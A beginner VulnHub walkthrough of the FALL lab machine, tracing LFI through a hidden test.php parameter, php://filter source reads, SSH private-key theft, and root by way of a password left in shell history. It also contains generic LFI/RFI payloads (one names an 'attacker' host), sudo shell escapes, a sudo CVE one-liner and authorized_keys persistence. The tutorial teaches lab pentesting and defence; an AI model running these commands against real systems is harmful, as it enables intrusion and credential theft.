# digitalworld.local: FALL — VulnHub Walkthrough (Beginner Friendly)

| Field | Value |
| --- | --- |
| **Machine** | digitalworld.local: FALL |
| **Difficulty** | Intermediate |
| **Author** | Donavan (digitalworld.local series) |
| **Released** | 6 September 2021 |
| **VulnHub Entry** | [digitalworld.local: FALL on VulnHub](https://vulnhub.com/entry/digitalworldlocal-fall,726/) |
| **Download** | [FALL.7z on VulnHub](https://vulnhub.com/entry/digitalworldlocal-fall,726/#download) |
| **Attacker** | Kali Linux (attacker 192.168.56.10, target 192.168.56.101) |
| **Target OS** | Linux (Fedora, Apache/mod_perl web stack) |

> **About this box:** FALL is an OSCP-style practice machine. It rewards *careful enumeration*
> (`careless` = hint #1) and the whole path is a web Local File Inclusion (LFI) followed by a
> credential leak. Banner versions and file paths "vary by build", so always trust your own scan
> output over this document.

**Legal note:** Only run this against the VM you downloaded, on an isolated host-only network that
you own. Never point these techniques at systems you do not have written permission to test.

---

> ### 📖 How to read this walkthrough
>
> Boxes marked **📖 Concept** stop and explain the *idea* behind what you are about to
> do — not just the command, but what it is and why it works. They are the point of
> this document; the commands are only the demonstration.
>
> Each box links to [`docs/CONCEPTS.md`](../../docs/CONCEPTS.md), the repository-wide
> primer on fundamentals (networking, how nmap works, wordlists, shells, privilege
> escalation). Read the box here for the idea, follow the link when you want the full
> treatment.
>
> **Brand new to this?** Start with
> [CONCEPTS §2 — Networking you must know first](../../docs/CONCEPTS.md#2-networking-you-must-know-first),
> then [§5 — What is nmap, and how does it work?](../../docs/CONCEPTS.md#5-what-is-nmap-and-how-does-it-work).

---

## 0. What you will learn

By the end of this box you will have practised:

- **Host discovery** on an isolated lab subnet with `arp-scan` and `nmap`.
- **Full TCP enumeration** — including services you might dismiss (SMB, MySQL, Cockpit).
- **Identifying a web CMS** (CMS Made Simple) and reasoning about its published attack surface.
- **Fuzzing a hidden GET parameter** with `ffuf` to find a file-inclusion entry point.
- **Local File Inclusion (LFI)** using the `php://filter` wrapper to read source code.
- **Reading secrets out of a config file** and using them safely (understanding why not every
  leaked credential is immediately useful).
- **Stealing an SSH private key** through LFI and logging in with it.
- **Discovering credentials in `.bash_history`** — a classic post-exploitation finding.
- **Escalating to root** with a plaintext `sudo` password.

**Prerequisites:** see [`docs/LAB-SETUP.md`](../../docs/LAB-SETUP.md) and
[`docs/TOOLS.md`](../../docs/TOOLS.md). You should have Kali running and be able to import the OVA.

---

## 1. Reconnaissance — finding the target

> **Goal:** work out the target's IP address on your isolated lab network.

Identify your own address first. The adapter facing the lab is usually `eth0` on a VirtualBox
host-only network (`192.168.56.x`) or a VMware host-only network.

```bash
ip a
```

```text
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP group default qlen 1000
    link/ether 08:00:27:aa:bb:cc brd ff:ff:ff:ff:ff:ff
    inet 192.168.56.10/24 brd 192.168.56.255 scope global dynamic eth0
```

> **How to read it:** Kali's lab interface holds a `192.168.56.x` (VirtualBox) or `192.168.19x.x`
> (VMware) address. The target will live on the **same** subnet.

Sweep the subnet with ARP — fast, because it never sends TCP packets:


> ### 📖 Concept — What is reconnaissance?
>
> **Reconnaissance** ("recon") is the phase where you work out *what exists*
> before you try to break into anything. It is deliberately broad and shallow: you
> are drawing a map, not attacking a position. The term comes straight from the
> military — send scouts to look at the terrain before committing troops.
>
> On a lab box, recon almost always means one thing: **find the target's IP.** The
> tools above do it with **ARP** — the layer-2 protocol that answers *"which
> hardware address owns this IP?"* ARP cannot be blocked by a host firewall the way
> TCP can, which is why it is the most reliable way to enumerate a local subnet. A
> machine that refuses to answer `ping` will still answer ARP.
>
> **Read the output carefully.** One entry is your gateway (usually `.1`), one is
> **you** (match the MAC from `ip a`), and the rest are candidates. The first three
> octets of a MAC identify the vendor: `08:00:27` is VirtualBox, `00:0c:29` and
> `00:50:56` are VMware, `00:15:5d` is Hyper-V. **Always confirm the target's MAC
> against your hypervisor's settings** — attacking the wrong host is the classic
> beginner error.
>
> **Deep dive:** [CONCEPTS §3 — What is reconnaissance?](../../docs/CONCEPTS.md#3-what-is-reconnaissance) ·
> [§4 — Host discovery](../../docs/CONCEPTS.md#4-host-discovery--who-is-out-there)

```bash
sudo arp-scan --interface=eth0 --localnet
```

```text
192.168.56.10   08:00:27:aa:bb:cc   PCS Systemtechnik GmbH   (this is Kali)
192.168.56.101  08:00:27:dd:ee:ff   PCS Systemtechnik GmbH
```

**Target IP:** `192.168.56.101` (yours may differ — use what *you* discover).

> **Why it works:** ARP asks "who owns this IP?" on the local segment, so every live host answers
> whether or not it blocks ICMP pings. It is the quickest way to find a freshly-booted VM.

![arp-scan showing the target](images/01-recon.png)

---


> ### 📖 Concept — What is enumeration, and how is it different from scanning?
>
> **Enumeration** is interrogating the services you found to extract *specific,
> actionable detail*: usernames, directory paths, share names, versions, database
> tables.
>
> | | **Scanning** | **Enumeration** |
> | --- | --- | --- |
> | Question | *"Is something there?"* | *"What exactly is there, and what can I ask it for?"* |
> | Output | Ports, versions | **Usernames, paths, shares, credentials, data** |
> | Example | `nmap -p- -sV` → "port 80 open" | `wpscan -e u` → "users: michael, steven" |
>
> **Enumeration produces the nouns that exploitation needs.** You cannot brute force
> a login without a username. You cannot crack a hash you never found. You cannot
> exploit an upload path you do not know. Every successful foothold traces back to an
> enumerated fact — which is why so many VulnHub authors write "ENUMERATION IS THE
> KEY" in capitals. They are telling you which phase you are skipping.
>
> **Deep dive:** [CONCEPTS §6 — What is enumeration?](../../docs/CONCEPTS.md#6-what-is-enumeration)

## 2. Enumeration

### 2.1 Full TCP sweep


> ### 📖 Concept — What is nmap, and how does a port scan work?
>
> **`nmap`** ("Network MAPper") discovers hosts and the services they run. It has no
> magic: it **sends deliberately crafted packets and classifies the responses**.
> Understand that and every flag becomes predictable.
>
> A **port** (0–65535) identifies *which program* on a host receives a packet; the IP
> address gets you to the machine, the port gets you to the service. TCP is
> connection-oriented, so a scan is really a conversation — the **three-way
> handshake**: `SYN` → `SYN-ACK` → `ACK`. The target has only three possible
> replies, and they map directly onto the words in the output:
>
> | Target's reply | nmap reports | Meaning |
> | --- | --- | --- |
> | **SYN-ACK** | `open` | A program is listening |
> | **RST** | `closed` | Host up, nothing listening there |
> | *(nothing)* / ICMP unreachable | `filtered` | A firewall dropped it |
>
> **Read the line everyone skips:** `Not shown: 65532 closed tcp ports
> (conn-refused)`. `65535 − 65532 = 3` interesting ports, and `(conn-refused)` is
> the *reason* — the target sent RSTs, so it is up and answering, not firewalled.
> Add `--reason` to any scan to see this evidence column explicitly; it is the best
> learning flag in nmap.
>
> **Key flags:** `-p-` scans **all** 65535 ports (the interesting service is often on
> `:8080`, `:666`, `:31337` — skipping this is how beginners get stuck); `-sV`
> fingerprints versions by reading banners and probing against ~10,000 known
> signatures; `-sC` runs the safe default NSE scripts; `-T4` is the right speed for
> labs (**`-T5` misses ports** because it abandons slow replies — a false negative is
> worse than slow); `-oA name` writes text, XML and greppable output at once; `sudo`
> enables the faster stealthier SYN scan instead of a full connect.
>
> **`-sV` is the pivot into everything else.** `Apache 2.4.29` implies Ubuntu 18.04;
> `OpenSSH 7.6p1` confirms it. Without versions you cannot use `searchsploit`.
>
> **Deep dive:** [CONCEPTS §5 — What is nmap, and how does it work?](../../docs/CONCEPTS.md#5-what-is-nmap-and-how-does-it-work)

```bash
sudo nmap -p- --min-rate 1000 -T4 -oA scans/fall-alltcp 192.168.56.101
```

> **How to read it:** `-p-` scans all 65,535 TCP ports instead of just the top 1000 — never skip it
> on a practice box. `-oA` saves normal/greppable/XML output for later.

### 2.2 Service and version detection

```bash
sudo nmap -sC -sV -p 22,80,139,443,445,3306,9090 -oA scans/fall-services 192.168.56.101
```

```text
PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 7.8 (protocol 2.0)
80/tcp   open  http        Apache httpd 2.4.39 (Fedora) mod_perl/2.0.10 Perl/v5.26.3
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X
443/tcp  open  ssl/http    Apache httpd 2.4.39 (Fedora)
445/tcp  open  netbios-ssn Samba smbd 4.8.10
3306/tcp open  mysql       MySQL (unauthorized)
9090/tcp open  http        Cockpit web service
```

> **How to read it:** Several interesting services appear. Port 80/443 is a web server; SMB and
> MySQL will be checked but are likely dead ends; **9090 is Cockpit** (a Linux web admin console).
> Exact banners vary by build.

![nmap service scan](images/02-nmap.png)

### 2.3 SMB and MySQL — quick dead-end checks


> ### 📖 Concept — SMB enumeration
>
> **SMB** (Server Message Block, ports 139/445) is Windows file and printer sharing,
> also present on most Linux servers via Samba. It is one of the richest enumeration
> targets there is: shares, users, groups, password policy, and often files.
>
> ```bash
> smbclient -L //target/ -N            # list shares with a NULL session (no credentials)
> smbclient //target/share -N          # connect; then: ls, cd, get, prompt, recurse
> smbmap -H target                     # shares AND your permission on each (R/W!)
> enum4linux -a target                 # users, groups, shares, policy — one shot
> crackmapexec smb target --shares     # modern, fast, scriptable
> rpcclient -U '' -N target            # then: enumdomusers, enumdomgroups, queryuser
> ```
>
> **Always try anonymous/NULL access first** — it is the most common finding. `-N`
> means "no password". If it works, `smbmap` will show `READ` or `WRITE` per share; a
> **writable** share you can reach over HTTP is a web-shell upload waiting to happen.
>
> Then hunt inside every share for `backup.zip`, `web.config`, `.kdbx`, `id_rsa`,
> `*.sql`, `site.txt`, `passwords.xls` — authors and real admins alike leave them
> there.
>
> **Deep dive:** [CONCEPTS §9.3 — SMB](../../docs/CONCEPTS.md#93-smb--ports-139445)

```bash
smbmap -H 192.168.56.101
enum4linux -a 192.168.56.101
```

```text
[+] IP: 192.168.56.101:445   Name: 192.168.56.101
        Disk        Permissions   Comment
        ----        -----------   -------
        print$      NO ACCESS     Printer Drivers
        IPC$        NO ACCESS     IPC Service (Samba 4.8.10)
```

> **How to read it:** No anonymous access to any share and no users enumerated. MySQL refuses
> remote logins. Note both and move on — good enumeration means *ruling things out*.

### 2.4 Directory brute-force on the web server


> ### 📖 Concept — What is content discovery, and what is a wordlist?
>
> **Content discovery** means *guessing URL paths and keeping the ones that exist*.
> There is no cleverness — it is a dictionary attack against the URL space. A web
> server will serve anything it has but does not advertise an index, so the tool
> requests `/admin`, `/backup`, `/config.php` … one at a time and classifies each
> response.
>
> A **wordlist** is a plain text file, one candidate per line. Its power comes from an
> empirical fact: **web directory names are not random.** `/admin`, `/phpmyadmin`,
> `/wp-content` appear on thousands of sites, so a curated list of a few thousand
> words beats a random generator of millions. Common sources on Kali:
>
> | List | Size | Notes |
> | --- | --- | --- |
> | `dirb/common.txt` | 4,612 | Hand-curated; fast first pass |
> | `dirb/big.txt` | 204,669 | Second pass; finds what `common` misses |
> | `directory-list-2.3-medium.txt` | 220,547 | Crawled from real sites |
> | **SecLists** | huge | The professional standard — `apt install seclists` |
>
> **The status codes are the whole result:** `200` exists and is readable · `201`
> means a `PUT` succeeded, **you can write files here** · `301` is usually a
> *directory* needing a trailing `/` · `403` means **it exists** but you may not read
> it — itself an information leak · `404` is the baseline · `500` means **your input
> broke something**, often injection.
>
> > **`401` vs `403` matters most.** `401` = "I don't know who you are"
> > (*authenticate*). `403` = "I know who you are and you may not" (*authorise*).
>
> **The extension flag (`-x` / `-X`) is the difference between finding nothing and
> finding everything.** `/secret` 404s; `/secret.txt` 200s. **If a scan comes back
> empty, change the extension list before you change the wordlist.** Try
> `php,txt,html,bak,old,zip,conf,log,inc`.
>
> **Deep dive:** [CONCEPTS §7 — What is a wordlist?](../../docs/CONCEPTS.md#7-what-is-a-wordlist) ·
> [§8 — Content discovery](../../docs/CONCEPTS.md#8-content-discovery--finding-hidden-urls)

```bash
ffuf -u http://192.168.56.101/FUZZ -w /usr/share/wordlists/dirb/common.txt \
     -e .html,.txt,.php -c
```

```text
admin        [Status: 301]
assets       [Status: 301]
config.php   [Status: 200]
index.php    [Status: 200]
modules      [Status: 301]
test.php     [Status: 200]
uploads      [Status: 301]
phpinfo.php  [Status: 200]
```

> **How to read it:** `index.php` is a **CMS Made Simple v2.2.15** site (`/admin` confirms it).
> `config.php` and `phpinfo.php` return something. But `test.php` is the odd one out — visit it.

Browsing `http://192.168.56.101/test.php` returns almost nothing, and the page source shows a
JavaScript hint:

```text
alert('Missing GET parameter')
```

> **Why it matters:** The script wants a GET parameter it never names. This is our fuzzing target.

### 2.5 Fuzz the hidden parameter

Two wordlists at once: one for the **parameter name**, one for an **LFI path value**.


> ### 📖 Concept — Where do wordlists come from?
>
> **`rockyou.txt`** is not a theoretical list. In 2009 the social-networking site
> RockYou was breached; they had stored **32 million passwords in plaintext** — no
> hashing at all. The dump became the most-used password list in security precisely
> because it records what real people actually chose. It has 14,344,392 entries,
> **ordered by observed frequency**, so the top of the file is disproportionately
> valuable. On Kali it ships gzipped:
>
> ```bash
> sudo gzip -dc /usr/share/wordlists/rockyou.txt.gz > rockyou.txt
> wc -l rockyou.txt      # 14344392
> ```
>
> **But a generic list fails against a themed box** — and that is where a *targeted*
> list wins:
>
> ```bash
> cewl -d 2 -m 4 --with-numbers -e -w custom.txt http://target/   # crawl the site, harvest ITS words
> python3 cupp.py -i                                             # build from a person's name, birthday, pet
> crunch 6 6 -t for%%% -o dict.txt                               # generate from a known pattern
> ```
>
> **`cewl` on a themed box is close to magic.** Authors pick passwords that fit their
> theme and then scatter theme words all over the website. `cewl` harvests exactly
> that vocabulary. If a box is called "Narak" and its homepage is full of Sanskrit
> words about hell, the password is very likely one of them — and very unlikely to be
> in `rockyou.txt`.
>
> **Deep dive:** [CONCEPTS §7 — What is a wordlist?](../../docs/CONCEPTS.md#7-what-is-a-wordlist)
> ### 📖 Concept — What is Local File Inclusion?
>
> **LFI** happens when a script passes a user-controlled path to `include()`,
> `require()` or a file-read function without validating it:
>
> ```php
> <?php include($_GET['page']); ?>     // you control a filesystem path
> ```
>
> Now you can read anything the web-server user can read:
>
> ```text
> ?page=/etc/passwd
> ?page=../../../../etc/passwd
> ?page=/var/log/apache2/access.log        # log poisoning
> ?page=/proc/self/environ
> ?page=/var/lib/php/sessions/sess_<your PHPSESSID>
> ```
>
> **The wrapper to memorise is `php://filter`** — it returns the file **base64-encoded
> instead of executing it**, so you can read PHP *source*:
>
> ```text
> ?page=php://filter/convert.base64-encode/resource=index.php
> ```
>
> That is how you recover `wp-config.php`, `configuration.php`, `.env` and
> `config/database.php` — i.e. the database credentials.
>
> **LFI alone only reads.** To get code execution you must make the target *write* a
> file you control somewhere predictable, then include it. The usual primitives: an
> **NFS export**, session files, **log poisoning** (inject PHP through a crafted
> `User-Agent`, then include the access log), or `/proc/self/environ`.
>
> **RFI** (`?page=http://attacker/shell.txt`) is the remote version and requires
> `allow_url_include=1` in `php.ini` — off by default since PHP 5.2. When it fails the
> error usually says `http:// wrapper is disabled`, which tells you to switch to LFI
> plus a local write.
>
> **Deep dive:** [CONCEPTS §13.2 — LFI](../../docs/CONCEPTS.md#132-local-file-inclusion-lfi) ·
> [§13.3 — RFI](../../docs/CONCEPTS.md#133-remote-file-inclusion-rfi)

```bash
ffuf -u 'http://192.168.56.101/test.php?W1=W2' \
     -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt:W1 \
     -w /usr/share/wordlists/LFI/file_inclusion_linux.txt:W2 -fw 3
```

```text
* W1: file
* W2: ../../../../../../etc/passwd
```

> **Why it works:** We ask ffuf to try every parameter name against every traversal payload. The
> winning combination `file=../../../../../../etc/passwd` proves a **Local File Inclusion**.

---

## 3. Foothold

### 3.1 Confirm the LFI

```bash
curl -s 'http://192.168.56.101/test.php?file=../../../../../../etc/passwd'
```

```text
root:x:0:0:root:/root:/bin/bash
daemon:x:2:2:daemon:/sbin:/sbin/nologin
...
qiu:x:1000:1000:qiu:/home/qiu:/bin/bash
mysql:x:27:27:MySQL Server:/var/lib/mysql:/bin/false
```

> **How to read it:** The `file` parameter includes arbitrary local files. Note the real user
> **`qiu`** (UID 1000) — that is our target account. This LFI is read-only, so we look for secrets
> to read rather than code to execute.

### 3.2 Read the CMS config with the php filter wrapper

Plain `include` runs PHP, so `config.php` would return nothing readable. The `php://filter` wrapper
lets us ask PHP to **base64-encode the file source** as it reads it:


> ### 📖 Concept — Encoding is not encryption
>
> These three get conflated constantly, and the confusion costs hours:
>
> | | **Encoding** | **Hashing** | **Encryption** |
> | --- | --- | --- | --- |
> | Purpose | Represent data in another *format* | Prove integrity / store passwords | Provide *confidentiality* |
> | Reversible? | **Yes — trivially, with no key** | **No** (only guessable) | Yes, **with the key** |
> | Key needed? | No | No | **Yes** |
> | Examples | base64, hex, URL-encoding, ROT13, binary | MD5, SHA-256, bcrypt, phpass | AES, RSA, ChaCha20 |
> | Security value | **Zero** | Depends on the algorithm | Depends on the key |
>
> **Recognise base64 on sight.** Three reliable tells: the character set is only
> `A–Z a–z 0–9 + /` with optional `=` padding; **the length is a multiple of 4**; and
> it is not a fixed-length digest with a `$1$`/`$6$`/`$P$` prefix.
>
> ```bash
> echo 'YWFydGk6YWFydGlAZ21haWwuY29t' | base64 -d; echo
> # aarti:aarti@gmail.com
> ```
>
> > **Base64 is not a secret.** It exists so binary data survives text-only transport
> > — email attachments, HTTP headers, JSON. Seeing it "protecting" a password is a
> > *finding*, not a defence. **Always check whether it is nested:** decode, then test
> > whether the result is itself base64 or hex. Some boxes chain two or three layers.
>
> **Identify hashes by prefix:** 32 hex = MD5 · 40 hex = SHA-1 · 64 hex = SHA-256 ·
> `$1$` = MD5-crypt · `$2b$` = bcrypt · `$6$` = SHA-512-crypt · `$y$` = yescrypt ·
> **`$P$`/`$H$` = phpass (WordPress, Drupal)** · `$apr1$` = Apache `.htpasswd` ·
> `pbkdf2_sha256$` = Django.
>
> **Deep dive:** [CONCEPTS §10 — Encoding vs hashing vs encryption](../../docs/CONCEPTS.md#10-encoding-vs-hashing-vs-encryption)

```bash
curl -s 'http://192.168.56.101/test.php?file=php://filter/convert.base64-encode/resource=config.php' | base64 -d
```

```php
<?php
# CMS Made Simple Configuration File
$config['dbms'] = 'mysqli';
$config['db_hostname'] = '127.0.0.1';
$config['db_username'] = 'cms_user';
$config['db_password'] = 'P@ssw0rdINSANITY';
$config['db_name'] = 'cms_db';
$config['db_prefix'] = 'cms_';
```

> **Why it works:** `php://filter` applies a stream filter (base64) to the file before PHP sees it,
> so we read the raw source instead of the executed output. The DB password is a nice find, but the
> database only listens on `127.0.0.1`, so it isn't directly usable. Native users will try
> `mysql -u cms_user -h 192.168.56.101` and get `ERROR 1130 (Host ... is not allowed)`.

### 3.3 Steal qiu's SSH private key

The LFI reads any file the web user can read. Private keys are high-value:


> ### 📖 Concept — SSH keys: the credential people forget
>
> An SSH **private key** is a credential exactly like a password, and finding one is
> often better than finding a password: no cracking, no lockout, no log noise from
> failed attempts.
>
> | File | What it is |
> | --- | --- |
> | `~/.ssh/id_rsa`, `id_ed25519`, `id_ecdsa` | **Private** key — never leaves the owner's machine. If you find one, you have that user's access. |
> | `~/.ssh/id_rsa.pub` | Public key — harmless on its own |
> | `~/.ssh/authorized_keys` | Public keys **permitted to log in as this user**. Writable? Append your own key and log in with no password. |
> | `~/.ssh/known_hosts` | Hosts this user has connected to — **a map of other machines to pivot toward** |
>
> ```bash
> ssh -i id_rsa user@target
> ssh -i id_rsa -o IdentitiesOnly=yes user@target      # ignore ssh-agent, use only this key
> ```
>
> **If the key is passphrase-protected**, crack it offline — you never touch the
> server:
>
> ```bash
> ssh2john id_rsa > key.hash
> john --wordlist=/usr/share/wordlists/rockyou.txt key.hash
> # or:  hashcat -m 22921 -a 0 key.hash rockyou.txt    (22931 for ed25519)
> ```
>
> **Writing your own key is the cleanest persistence there is:**
>
> ```bash
> ssh-keygen -t ed25519 -f labkey -N ''                # -N '' = no passphrase
> cat labkey.pub >> /home/user/.ssh/authorized_keys    # if you can write it
> chmod 600 /home/user/.ssh/authorized_keys            # ssh refuses loose permissions
> ssh -i labkey user@target
> ```
>
> Note the `chmod 600` — `sshd` **silently ignores** an `authorized_keys` with overly
> permissive modes, which makes "my key does not work" a permissions problem more
> often than a key problem.
>
> **Always try a found key against *every* user on *every* host** you know about. Key
> reuse across machines and accounts is extremely common.
>
> **Deep dive:** [CONCEPTS §9.9 — SSH](../../docs/CONCEPTS.md#99-ssh--port-22) ·
> [§16.2 — Harvesting credentials](../../docs/CONCEPTS.md#162-harvesting-credentials)

```bash
curl -s 'http://192.168.56.101/test.php?file=../../../../../../home/qiu/.ssh/id_rsa' | tee id_rsa
chmod 600 id_rsa
head -1 id_rsa
```

```text
-----BEGIN OPENSSH PRIVATE KEY-----
```

> **Why it works:** `.ssh/id_rsa` is readable by its owner (`qiu`), and the web process can read it
> too. SSH refuses a key with loose permissions, hence `chmod 600`.

### 3.4 Log in over SSH

```bash
ssh -i id_rsa qiu@192.168.56.101
```

```text
[qiu@FALL ~]$ id
uid=1000(qiu) gid=1000(qiu) groups=1000(qiu)
[qiu@FALL ~]$ cat local.txt
A low privilege shell! :-)
```

> **How to read it:** A working shell as `qiu` and the first flag. Flag contents vary by build.

![shell as qiu and the local flag](images/03-foothold.png)

---


> ### 📖 Concept — What is privilege escalation, and in what order do you try things?
>
> You have a shell as a low-privileged user — often `www-data`, the account Apache
> runs as, which has no usable password and no home directory. **Privilege
> escalation** is becoming an administrator: `root` on Linux, `SYSTEM` on Windows.
>
> Why bother? An ordinary user can read their own files and almost nothing else. Root
> reads every file, loads kernel modules, changes any password, and installs a
> backdoor that survives a reboot. On a CTF the root flag can only be read by root; in
> a real engagement root is the difference between "we found a weak password" and "the
> entire estate is compromised."
>
> **The discipline is a checklist, worked from cheapest to most destructive:**
>
> | Order | Check | Command |
> | --- | --- | --- |
> | 1 | **What may I already run as root?** | `sudo -l` ← *the single highest-value command* |
> | 2 | What binaries run as their owner regardless of caller? | `find / -perm -u=s -type f 2>/dev/null` |
> | 3 | What extra privileges are attached to binaries? | `getcap -r / 2>/dev/null` |
> | 4 | What runs on a schedule, as root? | `cat /etc/crontab`; `./pspy64 -pf` |
> | 5 | What root-owned file can I write to? | `find / -writable -type f 2>/dev/null` |
> | 6 | Can I read a credential that gets reused? | `wp-config.php`, `.env`, `~/.bash_history` |
> | 7 | Am I in a privileged group? | `id` → `docker`, `lxd`, `disk`, `sudo` |
> | 8 | Is the kernel old enough to exploit? | `uname -a` + `searchsploit` |
>
> **Work it in order.** Steps 1–7 take minutes and are safe. Step 8 (kernel exploits)
> can panic the VM and cost you a re-import, so it is a last resort, not a first
> instinct.
>
> **Also orient yourself first** — it is one line and it tells you which OS you are
> on, which decides everything else:
>
> ```bash
> id; whoami; hostname; uname -a; cat /etc/os-release
> ```
>
> **Deep dive:** [CONCEPTS §15 — Linux privilege escalation](../../docs/CONCEPTS.md#15-linux-privilege-escalation)

## 4. Privilege escalation

### 4.1 Read the shell history

Administrators often leave secrets in command history. Check it first:

```bash
cat ~/.bash_history
```


> ### 📖 Concept — What is sudo, and how do you read `sudo -l`?
>
> **`sudo`** ("superuser do") runs a command **as another user** — by default root. It
> exists so administrators can grant *specific* elevated abilities without handing out
> the root password. Its rules live in `/etc/sudoers`, edited only via `visudo`.
>
> `sudo -l` (**l**ist) shows what *you* are permitted. **It is the first command to
> run as any new user on any box** — it costs nothing, and a surprising fraction of
> machines are solved by one line of its output.
>
> **Parse the tokens precisely:**
>
> | Token | Meaning |
> | --- | --- |
> | `(ALL)` | may run as **any** user, including root |
> | `(root)` | only as root |
> | `(ALL:ALL)` | any user **and** any group |
> | `(user)` | only as that specific user — try `sudo -u user …` |
> | **`NOPASSWD:`** | **no password will be requested** |
> | `/usr/bin/foo` | only this binary, at this **absolute path** |
> | `/usr/bin/foo *` | with **any** arguments ← the dangerous case |
> | `/usr/bin/foo -m *` | only with these arguments |
> | `ALL` alone | full root, no restriction |
>
> **The rule that matters:** *any program that can execute another program, granted
> without argument restrictions, is a root shell in disguise.* `python`, `perl`,
> `ruby`, `lua`, `node`, `php`, `bash`, `find`, `vim`, `nano`, `less`, `more`, `man`,
> `awk`, `env`, `gdb`, `tar`, `zip`, `make`, `git`, `watch`, `nmap`, `ftp`.
>
> **Do not invent the payload — look it up on [GTFOBins](https://gtfobins.github.io/).**
> It documents exactly which binaries can be abused when SUID, sudo-able or run by a
> scheduler, organised by capability (shell, file read, file write, reverse shell).
> It is maintained, tested, and explains *why* each line works. The Windows equivalent
> is **LOLBAS**.
>
> ```bash
> sudo watch -x sh -c 'reset; exec sh'          # GTFOBins: watch
> sudo find . -exec /bin/sh \; -quit            # GTFOBins: find
> sudo vim -c ':!sh'                            # GTFOBins: vim
> sudo -u#-1 /bin/bash                           # CVE-2019-14287 (sudo < 1.8.28)
> ```
>
> **Deep dive:** [CONCEPTS §15.2 — sudo rights](../../docs/CONCEPTS.md#152-sudo-rights)

```text
ls -al
cat .bash_history
echo "remarkablyawesomE" | sudo -S dnf update
ifconfig
sudo -l
cat local.txt
```

> **How to read it:** The line `echo "remarkablyawesomE" | sudo -S dnf update` reveals a password
> being piped into `sudo -S` (read password from stdin). That is almost certainly **root's password**.
> The exact string varies by build — read your own file.

### 4.2 Become root

```bash
sudo -l
```

```text
User qiu may run the following commands on fall:
    (ALL) ALL
```

> **Why it works:** `(ALL) ALL` means `qiu` may run *any* command as *any* user. With root's
> password in hand we simply switch user.

```bash
sudo su -
# Password: remarkablyawesomE
id
```

```text
uid=0(root) gid=0(root) groups=0(root)
```

> **How to read it:** `uid=0(root)` confirms full control of the machine.

### 4.3 The root flag

```bash
cat /root/proof.txt
```

```text
Congrats on a root shell! :-)
```

> **Note:** Flag filenames and contents differ between builds. If `proof.txt` is absent, list
> `/root` and `/home/*` for any `*.txt` files before assuming something is wrong.

![root confirmation and flag](images/04-root-flag.png)

---

## 5. Summary of vulnerabilities

| # | Vulnerability | Where | Impact |
| --- | --- | --- | --- |
| 1 | Hidden GET parameter (`file`) with no sanitisation | `/test.php` on port 80 | Local File Inclusion (read any file the web user can read) |
| 2 | Secrets stored in a web-accessible config | `config.php` | Database credential disclosure |
| 3 | SSH private key readable by the web process | `/home/qiu/.ssh/id_rsa` | Account takeover as `qiu` over SSH |
| 4 | Root password left in `.bash_history` | `/home/qiu/.bash_history` | Credential disclosure |
| 5 | `qiu` granted unrestricted `sudo` with a known password | `sudo -l` → `(ALL) ALL` | Full privilege escalation to root |

---

## 6. Defensive lessons (blue team)

- **Never trust user input to `include`/`require`.** Whitelist allowed filenames; do not build file
  paths from GET parameters. Disable `allow_url_include` and consider open-basedir restrictions.
- **Keep secrets out of readable source.** A DB password in `config.php` is one LFI away from
  disclosure; use least-privilege DB accounts bound to specific hosts and rotating secrets.
- **Protect private keys.** Set `.ssh` to `0700` and `id_rsa` to `0600`, and never let the web
  service account read a user's home directory.
- **Scrub shell history.** Clear or rotate `.bash_history`; never type passwords on the command
  line (use `sudo` prompts or a secrets manager instead).
- **Follow least privilege for `sudo`.** `(ALL) ALL` is effectively root. Scope rules to exact
  commands and require explicit approval.
- **Patch and harden the web stack.** CMS Made Simple 2.2.15 is old; keep CMS platforms patched and
  remove sample/test scripts (`test.php`, `phpinfo.php`) from production.

---

## 7. References

- **Repository primer** — the fundamentals behind every command in this document: [`docs/CONCEPTS.md`](../../docs/CONCEPTS.md)

- [VulnHub official entry — digitalworld.local: FALL](https://vulnhub.com/entry/digitalworldlocal-fall,726/)
- [PHP manual — `php://` wrappers and filters](https://www.php.net/manual/en/wrappers.php.php)
- [OWASP — Testing for Local File Inclusion](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion)
- [MITRE ATT&CK T1552.003 — Unsecured Credentials: Bash History](https://attack.mitre.org/techniques/T1552/003/)
- [MITRE ATT&CK T1552.004 — Unsecured Credentials: Private Keys](https://attack.mitre.org/techniques/T1552/004/)
- [CMS Made Simple documentation](https://docs.cmsmadesimple.org/)

---

## 8. Screenshot checklist

- [ ] `images/01-recon.png` — ARP/host discovery showing the target IP
- [ ] `images/02-nmap.png` — TCP service scan (SSH, Apache, Samba, MySQL, Cockpit)
- [ ] `images/03-foothold.png` — output of `/etc/passwd` via LFI and the shell as `qiu`
- [ ] `images/04-config-php.png` — `config.php` source read through `php://filter`
- [ ] `images/05-id-rsa.png` — the stolen SSH private key
- [ ] `images/06-bash-history.png` — `.bash_history` showing the root password
- [ ] `images/07-root.png` — `id` confirming `uid=0(root)`
- [ ] `images/08-root-flag.png` — the root flag (`proof.txt`)

> **How to read it:** Store screenshots in `labs/digitalworldlocal-fall/images/` and reference them
> here with relative paths.

---

_Part of the [Cybersecurity101-Labs](../../README.md) collection. See the complete [catalog](../../docs/CATALOG.md). Educational use only in authorized lab environments._
